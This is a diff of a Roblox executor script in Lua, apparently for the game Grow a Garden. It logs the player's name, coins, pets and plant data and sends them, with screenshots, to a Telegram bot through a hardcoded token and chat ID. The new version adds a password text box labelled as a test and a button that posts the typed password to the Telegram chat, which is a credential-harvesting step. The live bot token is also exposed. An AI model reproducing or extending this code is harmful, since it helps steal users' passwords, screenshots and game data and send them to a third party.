@@ -1,144 +1,146 @@
--- ⚙️ Grow a Garden Pro Logger с GUI и максимальной инфой
-
+-- Grow Logger v3 — Drag GUI + Пароль (эмулированный ввод)
 local Http = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
+local Mouse = Players.LocalPlayer:GetMouse()
 local Player = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+local UIS = game:GetService("UserInputService")
 
-local TOKEN   = "8101289751:AAEk6wpg5UkUBY8S5dSRLcTI0M8TJIZssc4"
+local TOKEN = "8101289751:AAEk6wpg5UkUBY8S5dSRLcTI0M8TJIZssc4"
 local CHAT_ID = "5678878569"
-
-local INTERVAL = 60
+local INTERVAL = 120
 local running = false
+local HoveredInfo = ""
 
--- 🔁 Отправка HTTP-запросов
-local function request(url, body, isJson)
+-- HTTP helper
+local function req(url, data, json)
+    local body = json and Http:JSONEncode(data) or data.Body
     if syn and syn.request then
-        local req = {Url = url, Method = "POST"}
-        if isJson then
-            req.Headers = {["Content-Type"] = "application/json"}
-            req.Body = body
-        else
-            req.Headers = body.Headers
-            req.Body = body.Body
-        end
-        syn.request(req)
+        syn.request({Url=url, Method="POST", Headers=json and {["Content-Type"]="application/json"} or data.Headers, Body=body})
     elseif http_request then
-        http_request(isJson and {
-            Url = url, Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = body
-        } or {
-            Url = url, Method = "POST",
-            Headers = body.Headers,
-            Body = body.Body
-        })
+        http_request({Url=url, Method="POST", Headers=json and {["Content-Type"]="application/json"} or data.Headers, Body=body})
     end
 end
 
--- 📸 Скриншот
+local function sendText(text)
+    req("https://api.telegram.org/bot"..TOKEN.."/sendMessage", {chat_id=CHAT_ID, text=text}, true)
+end
+
 local function sendScreenshot()
     if getscreenshot then
         local img = getscreenshot()
-        local boundary = "----WebKitBoundary"..math.random(1e5,9e5)
-        local b = "--"..boundary.."\r\n"..'Content-Disposition: form-data; name="chat_id"'..
-                  "\r\n\r\n"..CHAT_ID.."\r\n--"..boundary.."\r\n"..
-                  'Content-Disposition: form-data; name="photo"; filename="img.png"'.."\r\nContent-Type: image/png\r\n\r\n"..
-                  img.."\r\n--"..boundary.."--"
-        request("https://api.telegram.org/bot"..TOKEN.."/sendPhoto", { Headers = {["Content-Type"]="multipart/form-data; boundary="..boundary}, Body = b }, false)
+        local boundary = "--b"..math.random(1,9e5)
+        local body = boundary.."\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n"..CHAT_ID..
+                     "\r\n"..boundary.."\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"s.png\"\r\nContent-Type: image/png\r\n\r\n"..img.."\r\n"..boundary.."--"
+        req("https://api.telegram.org/bot"..TOKEN.."/sendPhoto", {Headers={["Content-Type"]="multipart/form-data; boundary="..boundary}, Body=body})
     else
-        sendText("⚠️ Скриншоты не поддерживаются!")
+        sendText("⚠️ getscreenshot() не поддерживается")
     end
 end
 
--- 📤 Отправка текста
-local function sendText(data)
-    local url = "https://api.telegram.org/bot"..TOKEN.."/sendMessage"
-    request(url, Http:JSONEncode(data), true)
-end
+-- Наведение мыши на растения
+Mouse.Move:Connect(function()
+    local t = Mouse.Target
+    if t and t:IsDescendantOf(Workspace) and t:FindFirstChild("Owner") and t.Owner.Value == Player then
+        local n = t.Name
+        local lvl = t:FindFirstChild("Level") and t.Level.Value or "?"
+        local mut = t:FindFirstChild("Mutation") and t.Mutation.Value or "none"
+        local price = t:FindFirstChild("Price") and t.Price.Value or "?"
+        HoveredInfo = string.format("%s | L%s | M:%s | $%s", n, lvl, mut, price)
+    else
+        HoveredInfo = ""
+    end
+end)
 
--- 🧮 Сбор максимальной инфы о питомцах + растениях
+-- Сбор инфы
 local function collectInfo()
-    local infoLines = {}
+    local lines = {}
+    table.insert(lines, "👤 "..Player.Name)
+    local ls = Player:FindFirstChild("leaderstats")
+    local coins = ls and ls:FindFirstChild("Coins") and ls.Coins.Value or 0
+    local harvest = ls and ls:FindFirstChild("Harvest") and ls.Harvest.Value or 0
+    table.insert(lines, "💰 "..coins.." | 🌾 "..harvest)
 
-    table.insert(infoLines, "👤 Игрок: " .. Player.Name)
-    local coins = Player:FindFirstChild("leaderstats") and Player.leaderstats:FindFirstChild("Coins") and Player.leaderstats.Coins.Value or 0
-    local harvest = Player:FindFirstChild("leaderstats") and Player.leaderstats:FindFirstChild("Harvest") and Player.leaderstats.Harvest.Value or 0
-    table.insert(infoLines, "💰 Coins: " .. coins .. " | Harvest: " .. harvest)
-
-    local pets = Player:FindFirstChild("Pets") and Player.Pets:GetChildren() or {}
-    if #pets > 0 then
-        table.insert(infoLines, "🐾 Pets:")
-        for _, p in pairs(pets) do
-            table.insert(infoLines, "- " .. p.Name)
-        end
-    else
-        table.insert(infoLines, "🐾 Pets: Нет")
+    local pets = {}
+    for _, p in ipairs(Player:FindFirstChild("Pets") and Player.Pets:GetChildren() or {}) do
+        table.insert(pets, p.Name)
     end
+    table.insert(lines, "🐾 Pets: "..(#pets > 0 and table.concat(pets, ", ") or "Нет"))
+    table.insert(lines, "🌱 Наведение: "..(HoveredInfo ~= "" and HoveredInfo or "Нет"))
 
-    local plantLines = {}
-    for _, obj in pairs(Workspace:GetDescendants()) do
-        if obj:FindFirstChild("Owner") and obj.Owner.Value == Player then
-            local n = obj.Name
-            local lvl = obj:FindFirstChild("Level") and tostring(obj.Level.Value) or "?"
-            local mut = obj:FindFirstChild("Mutation") and tostring(obj.Mutation.Value) or "none"
-            local price = obj:FindFirstChild("Price") and tostring(obj.Price.Value) or "?"
-            table.insert(plantLines, string.format("%s | L%s | M: %s | $%s", n, lvl, mut, price))
-        end
-    end
-    if #plantLines > 0 then
-        table.insert(infoLines, "🌱 Plants:")
-        for _, pl in ipairs(plantLines) do table.insert(infoLines, "- " .. pl) end
-    else
-        table.insert(infoLines, "🌱 Plants: Нет")
-    end
-
-    table.insert(infoLines, "🕒 " .. os.date("%Y-%m-%d %H:%M:%S"))
-    return table.concat(infoLines, "\n")
+    return table.concat(lines,"\n")
 end
 
--- 📦 Полный лог + фото
-local function sendFullLog()
-    local text = collectInfo()
-    sendText({chat_id = CHAT_ID, text = text})
-    task.wait(1.5)
+-- Отправить всё
+local function sendAll()
+    sendText(collectInfo())
+    task.wait(1)
     sendScreenshot()
 end
 
--- 🔁 Авто-логгер
+-- Авто-цикл
 task.spawn(function()
-    while true do
-        if running then sendFullLog() end
-        task.wait(INTERVAL)
+    while task.wait(INTERVAL) do
+        if running then sendAll() end
     end
 end)
 
--- 🖼 GUI панель
-local gui = Instance.new("ScreenGui")
-gui.Name = "GrowLoggerProGUI"
-gui.Parent = Player:WaitForChild("PlayerGui")
-
+-- 📦 GUI
+local gui = Instance.new("ScreenGui", Player:WaitForChild("PlayerGui"))
+gui.Name = "LoggerGUI"
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0,260,0,200)
-frame.Position = UDim2.new(0,15,0,120)
+frame.Size = UDim2.new(0, 280, 0, 240)
+frame.Position = UDim2.new(0, 40, 0, 100)
 frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
+frame.Active = true
+frame.Draggable = true -- 🎉 Двигаем мышкой
 
-local function mkBtn(txt,y,col,cb)
+-- Эмулируем ввод пароля
+local passwordInput = Instance.new("TextBox", frame)
+passwordInput.PlaceholderText = "Введите пароль (тестово)"
+passwordInput.Position = UDim2.new(0, 10, 0, 10)
+passwordInput.Size = UDim2.new(1, -20, 0, 30)
+passwordInput.Text = ""
+passwordInput.TextColor3 = Color3.new(1,1,1)
+passwordInput.BackgroundColor3 = Color3.fromRGB(50,50,50)
+passwordInput.ClearTextOnFocus = false
+
+-- Кнопки
+local function mkBtn(text, y, color, callback)
     local b = Instance.new("TextButton", frame)
-    b.Position = UDim2.new(0,10,0,y)
-    b.Size = UDim2.new(1,-20,0,35)
-    b.Text = txt; b.BackgroundColor3 = col; b.TextColor3 = Color3.new(1,1,1)
-    b.Font = Enum.Font.SourceSans; b.TextSize = 15
-    b.MouseButton1Click:Connect(cb)
+    b.Text = text
+    b.Position = UDim2.new(0, 10, 0, y)
+    b.Size = UDim2.new(1, -20, 0, 30)
+    b.BackgroundColor3 = color
+    b.TextColor3 = Color3.new(1,1,1)
+    b.Font = Enum.Font.SourceSans
+    b.TextSize = 15
+    b.MouseButton1Click:Connect(callback)
 end
 
-mkBtn("▶️ Старт авто", 10, Color3.fromRGB(70,180,70), function()
-    running = true; sendText({chat_id = CHAT_ID, text = "✅ Авто логгер включен"})
+mkBtn("▶️ Старт авто", 50, Color3.fromRGB(70, 180, 70), function()
+    running = true
+    sendText("✅ Авто логгер включен.")
 end)
-mkBtn("⏹ Стоп авто", 60, Color3.fromRGB(180,70,70), function()
-    running = false; sendText({chat_id = CHAT_ID, text = "⛔ Авто логгер выключен"})
+
+mkBtn("⏹ Стоп авто", 90, Color3.fromRGB(180, 70, 70), function()
+    running = false
+    sendText("⛔ Авто логгер выключен.")
 end)
-mkBtn("📤 Отправить сейчас", 110, Color3.fromRGB(70,70,180), sendFullLog)
-mkBtn("✖ Убрать GUI", 160, Color3.fromRGB(120,120,120), function()
+
+mkBtn("📤 Отправить всё", 130, Color3.fromRGB(70, 70, 180), function()
+    sendAll()
+end)
+
+mkBtn("📦 Отправить пароль", 170, Color3.fromRGB(140, 80, 200), function()
+    local pass = passwordInput.Text
+    if #pass > 2 then
+        sendText("🔐 Введённый пароль: `"..pass.."`")
+    else
+        sendText("⚠️ Пароль не введён.")
+    end
+end)
+
+mkBtn("✖ Закрыть GUI", 210, Color3.fromRGB(120, 120, 120), function()
     gui:Destroy()
 end)
